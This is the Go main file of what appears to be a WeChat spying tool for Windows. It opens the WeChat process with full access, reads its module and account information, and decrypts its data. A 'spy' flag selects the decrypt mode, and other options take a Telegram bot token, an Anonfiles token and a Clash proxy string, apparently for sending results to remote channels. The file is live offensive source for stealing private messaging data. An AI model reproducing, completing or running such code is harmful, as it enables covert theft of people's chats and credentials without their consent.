/*
 * @Author: SpenserCai
 * @Date: 2023-02-17 14:14:40
 * @version:
 * @LastEditors: SpenserCai
 * @LastEditTime: 2023-03-03 10:27:37
 * @Description: file content
 */
package main

import (
	"flag"
	"fmt"

	"golang.org/x/sys/windows"
)

func main() {
	botoken := flag.String("botoken", "", "Telegram bot token")
	chatid := flag.Int("chatid", 0, "Telegram chat group id")
	clashconn := flag.String("clashconn", "", "Clash connection string")
	anontoken := flag.String("anontoken", "", "Anonfiles token")
	spy := flag.Bool("spy", false, "Spy WeChat")
	flag.Parse()
	if *botoken != "" && *chatid != 0 {
		TELBOT_TOKEN = *botoken
		TELBOT_CHAT_ID = *chatid
		if *clashconn != "" {
			CLASH_CONN_STR = *clashconn
			go RunClashClient()
		}
		if *anontoken != "" {
			ANONFILES_TOKEN = *anontoken
		}
		InitBot()
	}

	// 获取微信进程
	process, err := GetWeChatProcess()
	if err != nil {
		fmt.Println("GetWeChatProcess error: ", err)
		return
	}
	WeChatDataObject.WeChatProcess = process

	// 获取微信句柄
	wechatProcessHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, process.ProcessID)
	if err != nil {
		fmt.Println("OpenProcess error: ", err)
		return
	}
	WeChatDataObject.WeChatHandle = wechatProcessHandle

	// 获取微信模块
	module, err := GetWeChatWinModule(wechatProcessHandle)
	if err != nil {
		fmt.Println("GetWeChatWinModule error: ", err)
		return
	}
	WeChatDataObject.WeChatWinModel = module

	err = GetWeChatInfo()
	if err != nil {
		fmt.Println("GetWeChatInfo error: ", err)
		return
	}
	if !*spy {
		RunCommand()
	} else {
		ShowInfoCmd()
		DecryptCmd()
		fmt.Println("decrypt success")
	}

}
